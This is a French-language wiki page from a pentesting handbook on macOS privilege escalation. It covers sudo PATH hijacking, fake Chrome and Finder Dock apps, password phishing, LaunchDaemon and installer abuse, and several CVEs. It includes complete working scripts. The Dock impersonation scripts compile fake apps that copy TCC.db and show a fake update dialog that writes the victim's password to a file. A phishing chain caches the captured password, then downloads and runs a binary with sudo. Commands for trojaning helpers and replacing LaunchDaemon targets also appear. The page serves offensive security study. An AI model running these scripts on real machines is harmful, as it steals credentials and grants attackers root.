# Élévation de privilèges sur macOS

{{#include ../../banners/hacktricks-training.md}}

## Élévation de privilèges TCC

Si vous êtes arrivé ici à la recherche d’une élévation de privilèges TCC, rendez-vous ici :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Élévation de privilèges sous Linux

De nombreuses techniques d’élévation de privilèges qui affectent Linux ou d’autres systèmes de type Unix s’appliquent également à macOS. Voir :


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interaction avec l’utilisateur

### Sudo Hijacking

Vous trouverez la technique originale [Sudo Hijacking dans l’article sur l’élévation de privilèges sous Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l’utilisateur lorsqu’il exécute **`sudo`**. Cela signifie qu’une autre façon de réaliser cette attaque consiste à **détourner d’autres binaires** que la victime exécutera encore lorsqu’elle **lancera sudo :**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Notez qu’un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaries dans **`/opt/homebrew/bin`**.

### Usurpation du Dock

À l’aide d’un peu d’**ingénierie sociale**, vous pourriez **vous faire passer, par exemple, pour Google Chrome** dans le Dock et exécuter en réalité votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez si Chrome apparaît dans le Dock. Si c’est le cas, **supprimez** cette entrée et **ajoutez** la **fausse** entrée de **Chrome** à la même position dans le tableau du Dock.

<details>
<summary>Script d’usurpation de Chrome dans le Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous **ne pouvez pas supprimer Finder du Dock**. Si vous comptez l’ajouter au Dock, vous pouvez donc placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l’entrée du faux Finder au début du tableau du Dock**.
- Vous pouvez aussi ne pas le placer dans le Dock et simplement l’ouvrir : « Finder demande à contrôler Finder », ce n’est pas si étrange.
- Une autre option pour **escalader jusqu’à root sans demander** le mot de passe au moyen d’une boîte de dialogue horrible consiste à faire vraiment demander le mot de passe par Finder pour effectuer une action privilégiée :
  - Demandez à Finder de copier un nouveau fichier **`sudo`** dans **`/etc/pam.d`**. (L’invite demandant le mot de passe indiquera que « Finder veut copier sudo ».)
  - Demandez à Finder de copier un nouveau **plugin d’autorisation**. (Vous pouvez choisir le nom du fichier afin que l’invite demandant le mot de passe indique que « Finder veut copier Finder.bundle ».)

<details>
<summary>Script d’usurpation de Finder dans le Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Hameçonnage via invite de mot de passe + réutilisation de sudo

Les malwares abusent fréquemment de l’interaction utilisateur pour **capturer un mot de passe permettant d’utiliser sudo** et le réutiliser par programmation. Schéma courant :

1. Identifier l’utilisateur connecté avec `whoami`.
2. **Répéter les invites de mot de passe** jusqu’à ce que `dscl . -authonly "$user" "$pw"` renvoie un succès.
3. Mettre en cache l’identifiant (par exemple, dans `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe transmis via stdin).

Exemple de chaîne minimale :

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Le mot de passe volé peut ensuite être réutilisé pour **effacer la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d’autres fichiers privilégiés, et exécuter des étapes supplémentaires sans interaction.<sup>[[1]](#references)</sup>

#### Validation des mots de passe capturés via PAM

Une invite de saisie sécurisée d’apparence native peut recueillir le mot de passe d’un compte et le valider dans le processus via PAM, au lieu de lancer `dscl`, `security` ou `osascript`. Le processus appelant démarre une transaction PAM avec `pam_start`, transmet le mot de passe saisi via un callback de conversation, appelle `pam_authenticate`, puis ferme la transaction avec `pam_end`. En cas d’échec, il peut revenir au champ du mot de passe ; en cas de réussite, le mot de passe est confirmé sans lancer de processus de vérification distinct. L’authentification PAM, à elle seule, **n’élève pas** les privilèges de l’appelant et ne l’autorise pas à effectuer des opérations privilégiées.<sup>[[9]](#references)[[10]](#references)</sup>

Si les mots de passe de session et du Keychain sont identiques, le mot de passe capturé peut aussi être utilisable pour les opérations qui nécessitent le mot de passe actuel du Keychain ; voir [contraintes liées aux ACL et à la liste de partitions du Keychain](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Vecteurs spécifiques aux versions récentes de macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges`, bien que déprécié, reste utilisable

`AuthorizationExecuteWithPrivileges` a été déprécié dans la version 10.7, mais **fonctionne toujours sous Sonoma/Sequoia**. De nombreux programmes de mise à jour commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non fiable. Si le binaire ciblé est modifiable par l’utilisateur, vous pouvez y placer un trojan et profiter de l’invite légitime :

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Combinez avec les **techniques de masquerading ci-dessus** pour présenter une boîte de dialogue de mot de passe crédible.


### Triage des helpers privilégiés / XPC

Beaucoup de privescs macOS modernes dans des logiciels tiers suivent le même schéma : un **LaunchDaemon root** expose un **service Mach/XPC** depuis **`/Library/PrivilegedHelperTools`**, puis le helper soit **ne valide pas le client**, le valide **trop tard** (race de PID), ou expose une **méthode root** qui utilise un **chemin/script contrôlé par l’utilisateur**. C’est la classe de bugs à l’origine de nombreux bugs récents dans des helpers de clients VPN, de lanceurs de jeux et de programmes de mise à jour.<sup>[[2]](#references)</sup>

Liste de vérification rapide pour le triage :

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Accordez une attention particulière aux helpers qui :

- continuent d’accepter des requêtes **après la désinstallation** parce que le job est resté chargé dans `launchd`
- exécutent des scripts ou lisent des fichiers de configuration depuis **`/Applications/...`** ou d’autres chemins accessibles en écriture aux utilisateurs non root
- s’appuient sur une validation du pair basée sur le **PID** ou uniquement sur le **bundle ID**, susceptible aux race conditions

Pour plus de détails sur les failles d’autorisation des helpers, consultez [cette page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Héritage de l’environnement des scripts PackageKit (CVE-2024-27822)

Avant qu’Apple ne corrige le problème dans **Sonoma 14.5**, **Ventura 13.6.7** et **Monterey 12.7.5**, les installations lancées par l’utilisateur via **`Installer.app`** / **`PackageKit.framework`** pouvaient exécuter des scripts PKG en tant que root dans l’environnement de l’utilisateur actuel. Ainsi, un package utilisant **`#!/bin/zsh`** chargeait le fichier **`~/.zshenv`** de l’attaquant et l’exécutait en tant que root lorsque la victime installait le package.<sup>[[3]](#references)</sup>

C’est particulièrement intéressant comme **logic bomb** : il suffit d’avoir un foothold dans le compte de l’utilisateur et un fichier de démarrage du shell accessible en écriture, puis d’attendre que l’utilisateur exécute un installateur vulnérable basé sur **zsh**. Cela ne s’applique généralement pas aux déploiements **MDM/Munki**, car ils s’exécutent dans l’environnement de l’utilisateur root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Si vous souhaitez approfondir les abus propres aux installateurs, consultez également [cette page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Collision de destination d’installation via `.localized`

Certains installateurs tiers enregistrent un LaunchDaemon root dont l’exécutable est référencé par un chemin fixe dans `/Applications/Target.app`. Si un attaquant peut créer cette app en premier avec un **bundle identifier différent**, Installer peut conserver le leurre et placer l’app réelle dans `/Applications/Target.localized/Target.app`. Le daemon pointe toujours vers le chemin d’origine. Un exécutable contrôlé par l’attaquant dans le bundle leurre peut donc être exécuté ultérieurement en tant que root.<sup>[[8]](#references)</sup>

Les conditions préalables importantes sont les suivantes :<sup>[[8]](#references)</sup>

1. L’attaquant peut créer ou contrôler le chemin d’application attendu.
2. Le package ne supprime pas le bundle en conflit.
3. Le job privilégié utilise un chemin codé en dur dans ce bundle.
4. L’utilisateur ou un workflow MDM installe le package et enregistre le job.

Recherchez les bundles déplacés, puis examinez les cibles LaunchDaemon à l’aide de la boucle d’énumération de la section suivante :<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Un installateur plus sûr résout l’emplacement final du bundle et conserve les exécutables privilégiés dans un emplacement appartenant à root, comme `/Library/PrivilegedHelperTools`. Il devrait aussi vérifier la propriété et la signature du code avant d’enregistrer ou de démarrer le job.<sup>[[8]](#references)</sup>

### Détournement d’une cible LaunchDaemon modifiable

Un plist LaunchDaemon peut appartenir à root alors que son entrée `Program` ou sa première entrée `ProgramArguments` pointe vers un répertoire modifiable par un utilisateur. Vérifiez **l’intégralité du chemin**, pas seulement les permissions de l’exécutable. Si le répertoire parent est modifiable, un attaquant peut renommer un exécutable appartenant à root et créer un remplacement au même chemin. Le remplacement s’exécute en tant que root au prochain démarrage du job. Un redémarrage ou un simple redémarrage du service suffit. L’attaquant n’a pas besoin de l’autorisation d’exécuter `launchctl bootstrap` dans le domaine système.<sup>[[7]](#references)</sup>

Énumérez d’abord chaque cible et son répertoire parent immédiat :<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Lorsque le fichier ou son répertoire parent est accessible en écriture, préservez le binaire d’origine et remplacez le chemin par une charge utile exécutable. Attendez ensuite que le daemon déjà chargé redémarre.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Course sur le pointeur d’identifiants XNU SMR (CVE-2025-24118)

Le chemin vulnérable `kauth_cred_proc_update` mettait à jour `proc_ro.p_ucred` à l’aide de l’API non atomique `zalloc_ro_mut`, tandis que les lecteurs SMR chargeaient le pointeur sans verrou. Le déclenchement public utilise un binaire setgid préparé spécialement. Un thread alterne entre ses identifiants de groupe réel et effectif, tandis qu’un autre thread appelle à répétition un syscall tel que `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Traitez cela comme une **primitive de race condition**, et non comme un exploit root prêt à l’emploi. Le PoC publié démontre une déchirure du pointeur de credentials. Il se termine souvent par un kernel panic. Le chercheur n’a reproduit la corruption que sur Intel et n’a pas démontré de contrôle déterministe de l’objet de credentials résultant. Apple a remplacé la mise à jour par un échange atomique de pointeur dans macOS 15.3.<sup>[[4]](#references)</sup>

### Contournement de SIP via l’assistant de migration (« Migraine », CVE-2023-32369)

Même si vous avez déjà root, SIP bloque toujours les écritures dans les emplacements système. Le bug **Migraine** exploite l’entitlement de Migration Assistant `com.apple.rootless.install.heritable` pour lancer un processus enfant qui hérite du contournement de SIP et écrase des chemins protégés (par exemple, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La chaîne d’exploitation :

1. Obtenir root sur un système en fonctionnement.
2. Déclencher `systemmigrationd` avec un état spécialement conçu pour exécuter un binaire contrôlé par l’attaquant.
3. Utiliser l’entitlement hérité pour modifier des fichiers protégés par SIP, et conserver les modifications même après un redémarrage.

### Contournement de NSPredicate/XPC par injection d’expressions (classe de bugs CVE-2023-23530/23531)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et ne valident que le champ `expressionType`, contrôlé par l’attaquant. En créant un prédicat qui évalue des sélecteurs arbitraires, vous pouvez obtenir une **exécution de code dans des services XPC root/système** (par exemple, `coreduetd`, `contextstored`). Associée à une évasion initiale du sandbox d’une app, cette technique permet une **escalade de privilèges sans invite utilisateur**. Recherchez les points de terminaison XPC qui désérialisent des prédicats sans utiliser de visitor robuste.<sup>[[6]](#references)</sup>

## TCC - Escalade de privilèges root

### CVE-2020-9771 - Contournement de TCC et escalade de privilèges via mount_apfs

**N’importe quel utilisateur** (même sans privilèges) peut créer et monter un snapshot Time Machine avec `-o noowners` et **accéder à TOUS les fichiers** de ce snapshot, en contournant les contrôles de propriété appliqués au volume actif. Le seul privilège requis est que l’application utilisée (comme `Terminal`) dispose de l’accès complet au disque (**Full Disk Access**) (`kTCCServiceSystemPolicyAllfiles`).

Les commandes et l’explication complète se trouvent sur la page consacrée aux contournements de TCC :

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informations sensibles

Cela peut être utile pour élever ses privilèges :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, l’année de l’Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165 : escalade locale de privilèges via AWS Client VPN pour macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822 : escalade de privilèges via macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE : CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft « Migraine » : contournement de SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Une nouvelle classe de bugs d’escalade de privilèges sur macOS et iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Détournement de LaunchDaemon : escalade de privilèges et persistance via des permissions de dossier non sécurisées](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE macOS via le répertoire .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer : malware macOS se faisant passer pour une app de gestion du presse-papiers](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - Analyse approfondie de MacSync](https://securelist.com/macsync-new-version/121383/)
